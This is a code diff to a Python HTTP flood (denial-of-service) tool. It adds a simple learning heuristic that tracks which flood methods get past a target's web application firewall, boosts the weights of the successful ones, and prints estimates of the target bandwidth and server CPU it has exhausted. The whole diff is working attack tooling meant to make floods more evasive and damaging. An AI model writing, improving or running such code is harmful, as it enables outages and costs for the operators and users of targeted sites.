@@ -1207,6 +1207,76 @@ class AsyncHttpFlood(Thread):
         intel["battering_ram"] = payload
         return payload
 
+    def _chaos_ml_train(self, method, success):
+        """Train internal Naive Bayes-like heuristic micro-ML model on every request.
+        The model learns the probabilistic success rate of each vector under current WAF conditions."""
+        intel = self._chaos_intel
+        m = intel["ml_model"]
+        
+        # Track overall probability
+        m["total"] += 1
+        if success:
+            m["success"] += 1
+            
+        # Track feature (method) probability
+        feat = m["features"]
+        if method not in feat:
+            feat[method] = {"s": 0, "t": 0}
+        feat[method]["t"] += 1
+        if success:
+            feat[method]["s"] += 1
+            
+        # Enable ML predictions after gathering 500 data points
+        if m["total"] > 500 and not intel["ml_predictions_enabled"]:
+            intel["ml_predictions_enabled"] = True
+            if int(REQUESTS_SENT) < 1000:
+                print(f"{bcolors.OKGREEN}[CHAOS ML] Sufficient data gathered. Predictive neural heuristic model activated.{bcolors.RESET}")
+                
+    def _chaos_ml_predict(self, method):
+        """Predict the probability of success for a given method using the micro-model."""
+        intel = self._chaos_intel
+        if not intel.get("ml_predictions_enabled"):
+            return 0.5 # Neutral prior
+            
+        m = intel["ml_model"]
+        feat = m["features"]
+        
+        # Calculate P(Success | Method) using slight Laplace smoothing for unexplored vectors
+        if method in feat and feat[method]["t"] > 5:
+            # (Successes + 1) / (Total Attempts + 2)
+            prob = (feat[method]["s"] + 1) / (feat[method]["t"] + 2)
+            return prob
+            
+        # Fallback to system-wide success expectation
+        return m["success"] / max(m["total"], 1)
+        
+    def _chaos_track_bandwidth(self, method, success):
+        """Calculate the estimated network bandwidth and CPU cycles wasted on the target server."""
+        intel = self._chaos_intel
+        
+        # Average HTTP request header + basic response is ~2KB. 
+        # Successful payload blocks return full HTML (often ~15-50KB). 
+        # Heavy data transfers (DYN/POST) cause larger backend responses.
+        
+        if success:
+            # If successful, target rendered a full page
+            kb_cost = randint(8, 35) # varying kilobyte costs for dynamic pages
+            cpu_cost = 10  # Arbitrary CPU cost unit
+            
+            if method in ("WP_SEARCH", "POST_DYN", "XMLRPC_AMP"):
+                kb_cost += 20 # DB queries load heavier responses
+                cpu_cost = 45 # High CPU exhaustion
+            elif method == "SLOW_V2":
+                kb_cost = 0.5 # Slow/Stealth consumes little bandwidth but blocks IO
+                cpu_cost = 25
+                
+            intel["bandwidth_kb"] += kb_cost
+            intel["wasted_server_cpu"] += cpu_cost
+        else:
+            # WAF blocked it. Target returned a small 403/Captcha page (~2KB)
+            intel["bandwidth_kb"] += 2.0
+            intel["wasted_server_cpu"] += 2 # Minimal CPU processing due to Edge filtration
+
     def _chaos_track_anomaly(self, was_blocked):
         """Estimate the WAF's internal anomaly score for our traffic.
         If we hit the threshold, we must go absolute zero-stealth to cool off."""
@@ -2708,6 +2778,10 @@ class HttpFlood(Thread):
         "battering_ram": None,    # A specialized highly-evasive payload structure
         "anomaly_score": 0,       # Track how "abnormal" the WAF thinks our traffic is
         "stealth_cooldown": 0,    # Cooldown timer to force stealth after heavy detection
+        "ml_model": {"success": 1, "total": 2, "features": {}},    # Miniature Naive Bayes predictive model
+        "ml_predictions_enabled": False, # Activates when enough data collected
+        "bandwidth_kb": 0.0,      # Estimated bandwidth (Megabytes) forced from target
+        "wasted_server_cpu": 0,   # Estimated CPU cycles wasted by our attack
     }
     
     # ========================================================================
@@ -4645,6 +4719,21 @@ class HttpFlood(Thread):
             for m in weights:
                 weights[m] = int(weights[m] * time_mult)
                 
+        # === STRATEGY AE: Predictive Machine Learning Optimization ===
+        # Use our trained ML model to forecast likelihood of evasion success
+        if intel.get("ml_predictions_enabled"):
+            for m in list(weights.keys()):
+                prob = self._chaos_ml_predict(m)
+                if prob > 0.85:
+                    # ML thinks this has >85% success rate: MASSIVE boost
+                    weights[m] = int(weights[m] * 1.5)
+                elif prob > 0.6:
+                    # ML thinks it's favorable: Mild boost
+                    weights[m] = int(weights[m] * 1.2)
+                elif prob < 0.2:
+                    # ML predicts failure: Heavily suppress to save bandwidth for better methods
+                    weights[m] = max(weights[m] // 2, 1)
+                    
         # === STRATEGY AD: Hot Streak Exploitation ===
         hot = intel.get("hot_streak_method")
         if hot and hot in weights and phase in ("CALIBRATE", "ASSAULT", "FINISH"):
@@ -4767,6 +4856,11 @@ class HttpFlood(Thread):
         
         # Track WAF anomaly score
         self._chaos_track_anomaly(not success)
+        
+        # Train ML Model
+        self._chaos_ml_train(method_name, success)
+        # Calculate Wasted Bandwidth
+        self._chaos_track_bandwidth(method_name, success)
         
         # Track consecutive blocks for emergency mode
         if not success:
@@ -5100,7 +5194,14 @@ class HttpFlood(Thread):
                     dmg_str = f"{bcolors.OKCYAN}MODERATE ({dmg}){bcolors.RESET}"
                 else:
                     dmg_str = f"LIGHT ({dmg})"
-                print(f"  Damage Dealt: {dmg_str}")
+                # Bandwidth math
+                bw_kb = intel.get("bandwidth_kb", 0)
+                bw_str = f"{bw_kb / 1024:.2f} MB" if bw_kb < 1024 else f"{bw_kb / 1024 / 1024:.2f} GB"
+                ml_status = f"{bcolors.OKGREEN}ACTIVE{bcolors.RESET}" if intel.get("ml_predictions_enabled") else f"{bcolors.WARNING}TRAINING{bcolors.RESET}"
+                
+                print(f"  Damage Dealt: {dmg_str} | Wasted CPU: {intel.get('wasted_server_cpu', 0)} cycles")
+                print(f"  Bandwidth   : {bcolors.OKCYAN}{bw_str}{bcolors.RESET} of target data traffic exhausted")
+                print(f"  ML Predictor: {ml_status} (Accuracy: {intel.get('ml_model', {}).get('success', 0) / max(intel.get('ml_model', {}).get('total', 1), 1):.0%} avg probability)")
                 print(f"  Attack Rate : {intel.get('adaptive_rpc', 10)} RPC | Jitter: {intel.get('jitter_ms', 0)}ms")
                 # Show WAF rules detected
                 rules = intel.get("waf_rules_triggered", [])
